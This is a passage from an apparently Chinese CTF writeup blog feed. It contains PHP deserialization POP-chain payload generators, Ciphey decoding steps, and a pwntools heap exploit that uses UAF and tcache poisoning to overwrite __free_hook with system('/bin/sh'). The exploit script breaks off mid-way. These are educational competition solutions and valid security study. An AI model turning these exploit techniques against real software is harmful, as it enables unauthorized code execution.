class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="string">&quot;0&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cheng</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;c1 = <span class="keyword">new</span> <span class="title function_ invoke__">bei</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bei</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b2</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;b1 = <span class="keyword">new</span> <span class="title function_ invoke__">yang</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">yang</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$y1</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$y2</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;y1 = <span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title function_ invoke__">cheng</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$o</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将exp生成的payload放入POST传输,在phpinfo里面可以看到flag</p><p><img src="/2022/09/04/2022%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWriteup/image-20220903195749190.png"></p><h3 id="3-Safepop"><a href="#3-Safepop" class="headerlink" title="3.Safepop"></a>3.Safepop</h3><blockquote><p>简单的pop链构造</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Test</span>::<span class="title function_ invoke__">getFlag</span>()-&gt;<span class="title class_">Fun</span>::<span class="title function_ invoke__">__call</span>(绕__wakeup) -&gt; A::<span class="title function_ invoke__">__get</span>() -&gt; B::<span class="title function_ invoke__">__destruct</span>()</span><br><span class="line"><span class="comment"># A-&gt;a = Fun()</span></span><br><span class="line"><span class="comment"># B-&gt;a = A()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># __call 通过call_user_func_array调用数组传参 -&gt; Fun-&gt;func=[new Test,&#x27;getFlag&#x27;]</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fun</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func = [<span class="keyword">new</span> <span class="title class_">Test</span>,<span class="string">&#x27;getFlag&#x27;</span>]; <span class="comment">// or $this-&gt;func = &quot;Test::getFlag&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$T</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$F</span> = <span class="keyword">new</span> <span class="title class_">Fun</span>();</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;a = <span class="variable">$F</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$aser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;Fun&quot;:1:&#x27;</span>,<span class="string">&#x27;&quot;Fun&quot;:2:&#x27;</span>,<span class="variable">$aser</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$ser</span>);</span><br></pre></td></tr></table></figure><blockquote><p>后面发现除了常规思路，还有别的。而且是原题😅，具体见文章：<a href="https://blog.csdn.net/qq_45619909/article/details/122803600">利用PHP垃圾回收机制构造POP链</a> 😅</p></blockquote><p>文章中另一种思路是利用垃圾回收机制</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># chao code.</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="keyword">new</span> <span class="title class_">Fun</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fun</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span> = <span class="string">&#x27;call_user_func_array&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func =<span class="string">&quot;Test::getFlag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">array</span>(<span class="keyword">new</span> B, <span class="keyword">new</span> B);</span><br><span class="line"><span class="variable">$tmp</span> = <span class="string">&quot;i:0;&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> B);</span><br><span class="line"><span class="variable">$a</span> =  <span class="title function_ invoke__">serialize</span>(<span class="variable">$o</span>);</span><br><span class="line"><span class="variable">$z</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$tmp</span>,<span class="variable">$tmp</span>.<span class="string">&quot; &quot;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;O:3:&quot;Fun&quot;:1:&#x27;</span>,<span class="string">&#x27;O:3:&quot;Fun&quot;:2:&#x27;</span>,<span class="variable">$z</span>));</span><br></pre></td></tr></table></figure><blockquote><p>更多详情参考如下：</p><p><a href="https://www.anquanke.com/post/id/149421">如何攻破PHP的垃圾回收和反序列化机制（上）</a></p><p><a href="https://www.anquanke.com/post/id/149424">如何攻破PHP的垃圾回收和反序列化机制（下）</a></p></blockquote><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签个到"><a href="#签个到" class="headerlink" title="签个到"></a>签个到</h3><p><a href="https://github.com/Ciphey/Ciphey">Ciphey</a></p><p><a href="https://blog.csdn.net/qq_35493457/article/details/123781939">Ciphey安装报错解决</a></p><blockquote><p>⚡ Automatically decrypt encryptions without knowing the key or cipher, decode encodings, and crack hashes ⚡</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Tao in ~\Downloads λ ciphey.exe -f .\26.txt -C regex -p regex.regex=flag</span><br><span class="line">╭────────────────────────────────────────────────────────────╮</span><br><span class="line">│ Formats used:                                          │</span><br><span class="line">│    caesar:                                                 │</span><br><span class="line">│     Key: 13                                                │</span><br><span class="line">│    base32                                                  │</span><br><span class="line">│    utf8Plaintext: &quot;flag&#123;5dcf3d3407891ba725ffd13224de5435&#125;&quot; │</span><br><span class="line">╰────────────────────────────────────────────────────────────╯</span><br></pre></td></tr></table></figure><h3 id="where-is-secret"><a href="#where-is-secret" class="headerlink" title="where_is_secret"></a>where_is_secret</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> ciphey.exe -f .\vig.txt</span><br><span class="line"># 跑了半个小时，发现key-&gt;gwhtgwht,还有个密码，但密码不对</span><br></pre></td></tr></table></figure><p>two years later……</p><p>尝试使用key-&gt;<code>gwht</code>, 维吉尼亚解密</p><p><img src="/2022/09/04/2022%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWriteup/image-20220904111005032.png"></p><p>哎哎哎，就是玩。猜的很开心😇</p><p>解压出bmp后，根据题目给的hint,在网上找到解密脚本（图片藏小说。。。）</p><blockquote><p><a href="https://blog.csdn.net/weixin_54581900/article/details/122740876">https://blog.csdn.net/weixin_54581900/article/details/122740876</a></p></blockquote><p>运行解密后，文本是<code>自卑与超越</code></p><p><img src="/2022/09/04/2022%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWriteup/image-20220904111311559.png"></p><p>发现小说中穿插着flag,two years later…</p><p>根据混杂穿插特征手动得到flag为<code>h1d3_1n_th3_p1ctur3</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2022 </tag>
            
            <tag> 2022年羊城杯网络安全大赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第二届鹤城杯河南-鹤壁CTF网络安全挑战赛初赛</title>
      <link href="/2022/08/31/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%B9%A4%E5%9F%8E%E6%9D%AF%E6%B2%B3%E5%8D%97-%E9%B9%A4%E5%A3%81CTF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B/"/>
      <url>/2022/08/31/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%B9%A4%E5%9F%8E%E6%9D%AF%E6%B2%B3%E5%8D%97-%E9%B9%A4%E5%A3%81CTF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<blockquote><p>初赛线上答题</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2022 </tag>
            
            <tag> 第二届鹤城杯河南-鹤壁CTF网络安全挑战赛初赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022年第三届网鼎杯青龙组-NULL</title>
      <link href="/2022/08/26/2022%E5%B9%B4%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84-NULL/"/>
      <url>/2022/08/26/2022%E5%B9%B4%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84-NULL/</url>
      
        <content type="html"><![CDATA[<blockquote><p>NULL</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2022 </tag>
            
            <tag> 2022年第三届网鼎杯青龙组 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第二届长城杯网络安全大赛-NULL</title>
      <link href="/2022/08/23/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-NULL/"/>
      <url>/2022/08/23/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-NULL/</url>
      
        <content type="html"><![CDATA[<blockquote><p>NULL</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2022 </tag>
            
            <tag> 第二届长城杯网络安全大赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022巅峰极客网络安全技能挑战赛初赛Writeup</title>
      <link href="/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/"/>
      <url>/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/</url>
      
        <content type="html"><![CDATA[<blockquote><p>By ACT Team. 2022.8.18</p></blockquote><p>本次比赛共有3个Pwn题，有一题是在赛后解出</p><p><img src="/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220818123627268.png"></p><hr><h3 id="1-Gift"><a href="#1-Gift" class="headerlink" title="1.Gift"></a>1.Gift</h3><h4 id="1-1-逆向分析"><a href="#1-1-逆向分析" class="headerlink" title="1.1 逆向分析"></a>1.1 逆向分析</h4><p><img src="/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220818123934659.png"></p><p>在<code>delete</code>功能中堆指针未置空存在<code>UAF</code>，但是程序中没有<code>edit</code>功能有点鸡肋</p><p><img src="/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220818124054555.png"></p><p><img src="/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220818124347880.png"></p><p>另外还存在一个<code>backdoor</code>的功能，可以用来控制<code>delete</code>后的<code>tcache fd</code>指针，但是限制只能是减去<code>0x10</code>及以内的值，可以通过减去负数来绕过达到加的效果，需要注意<code>read_num</code>函数中返回值是无符号整数，那也导致加的范围有限，所以修改的<code>fd</code>指针范围应该在<code>heap</code>段内</p><p><img src="/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220818125635331.png"></p><p>这里要注意的是<code>add</code>功能中有计数器，只能申请<code>10</code>个堆块，又因为存在<code>UAF</code>指针未清空的话，导致只能使用<code>10</code>次<code>add</code>，<code>idx</code>范围是<code>0-9</code>，相对于一般的堆题可以<code>add</code>的次数比较少，另外限制了<code>size</code>，只有固定的两种选择<code>0x100</code>或者<code>0x60</code>，那么要通过<code>unsorted bin</code>泄露<code>libc</code>的话，直接需要8个堆块(7个填充<code>tcache</code>)，这里就是题目里的主要限制，要巧妙的进行堆风水布局</p><h4 id="1-2-libc版本"><a href="#1-2-libc版本" class="headerlink" title="1.2 libc版本"></a>1.2 libc版本</h4><p>本题没有给出<code>libc</code>文件，由于程序存在<code>UAF</code>，通过<code>double free</code>尝试看报错信息（这里我是在本地触发）</p><p><img src="/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220818125105879.png"></p><p>会有<code>tcache</code>相关的报错，说明libc版本<code>&gt;=2.27</code>，然后就找了一些常用的libc版本测试，最后发现直接用我的ubuntu18虚拟机自身的libc就打通了</p><h4 id="1-3-解题"><a href="#1-3-解题" class="headerlink" title="1.3 解题"></a>1.3 解题</h4><p>申请7个堆块，然后按特定顺序都free掉</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[add(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]   <span class="comment">#0-4</span></span><br><span class="line">add(<span class="number">1</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>))            <span class="comment">#5,include fake_chunk</span></span><br><span class="line">add(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)                       <span class="comment">#6</span></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">[delete(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line">delete(<span class="number">5</span>)</span><br></pre></td></tr></table></figure><p>这样做的目的是之后构造出<code>tcache</code>里面<code>chunk5-&gt;fake_chunk</code>的状态，因为使用<code>backdoor</code>功能修改<code>fd</code>有限制，只有使用负数才能大幅度修改<code>fd</code>，而负数又是增加<code>fd</code>指针的效果，所以把关键的<code>chunk5</code>布局到相对后面的位置*(之后还要通过<code>fake_chunk</code>来控制<code>chunk6</code>)*，然后<code>chunk5</code>最后删除，这样<code>chunk5_fd</code>的值就会小于<code>fake_chunk_addr</code>，之后通过<code>backdoor</code>功能增加fd值偏移到<code>fake_chunk</code>的位置</p><p>接着通过<code>unsorted bin</code>的指针来泄露<code>libc</code>，注意这里再次<code>free chunk0</code>，因为我们修改了头节点指针(<code>chunk6_fd</code>)后，堆管理器就找不着刚开始free掉的堆块了，所以自然不会触发<code>double free</code>的报错，刚开始已经删了7个堆块，那么就填满了<code>tcache</code>，再次<code>free chunk0</code>就会进入<code>unsorted bin</code>，这里只要不是<code>chunk6</code>(还在tcache链中) free哪个堆块都行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#UAF edit chunk6_fd-&gt;fake_chunk</span></span><br><span class="line">backdoor(<span class="number">5</span>,-<span class="number">0x130</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line"><span class="comment">#由于前面已经修改过fd，所以再次free chunk0不会触发检查</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;cost: &#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)) -<span class="number">0x10</span> -<span class="number">96</span> -libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"><span class="comment">#libc_base = int(p.recvuntil(b&#x27;\n&#x27;))-0x3ebca0</span></span><br><span class="line">free_hook = libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure><p>前面做的工作都是铺垫，现在来到重点，我们要构造出<code>tcache</code>链表状态如下：</p><p><img src="/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220818133312144.png"></p><p>首先申请到<code>chunk5</code>（此时<code>idx</code>是<code>7</code>，<code>chunk5_ptr</code>等于<code>chunk7_ptr</code>），然后马上修改<code>fake_chunk</code>的<code>fd</code>，让<code>fake_chunk_fd-&gt;free_hook</code>，就正好使用3次<code>add</code>功能控制到<code>free_hook</code>加上刚开始的7个堆块共是10次，然后这里要注意的是程序的功能中堆块内容区开头的<code>0x10</code>字节另有用途无法修改，所以我们第二次申请获得<code>fake_chunk</code>的时候修改<code>chunk6_content</code>为<code>/bin/sh</code>，第三次申请获得<code>free_hook</code>修改为<code>system</code>。关于这里为什么没有直接使用<code>one_gadget</code>的原因解释下，主要是libc版本未知，而不同libc版本one_gadget位置不同内存状态也不会一模一样，不好选用哪个one_gadget，需要一定的调试时间，使用<code>system(&#39;/bin/sh&#39;)</code>的方式就比较稳妥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#申请回chunk5,修改其中fake_chunk_fd</span></span><br><span class="line">add(<span class="number">1</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>)+p64(free_hook-<span class="number">0x10</span>)+p64(<span class="number">0</span>)+<span class="string">b&#x27;z&#x27;</span>*<span class="number">8</span>)   <span class="comment">#chunk5,idx=7</span></span><br><span class="line"><span class="comment">#从fake_chunk开始填充，修改chunk6_content</span></span><br><span class="line">add(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xd0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)            <span class="comment">#fake_chunk,idx=8</span></span><br><span class="line">add(<span class="number">1</span>,p64(system))                                           <span class="comment">#free_hook,idx=9</span></span><br><span class="line">delete(<span class="number">6</span>)</span><br></pre></td></tr></table></figure><p>最后，完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;123.56.45.214&#x27;,14822)</span></span><br><span class="line">p = process(<span class="string">&quot;./gift&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;gift&#x27;</span>)</span><br><span class="line">libc= elf.libc</span><br><span class="line"></span><br><span class="line">menu = <span class="string">b&#x27;choice:&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">t,content=<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span>):</span><br><span class="line">    p.sendlineafter(menu,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice:&#x27;</span>,<span class="built_in">str</span>(t).encode())</span><br><span class="line">    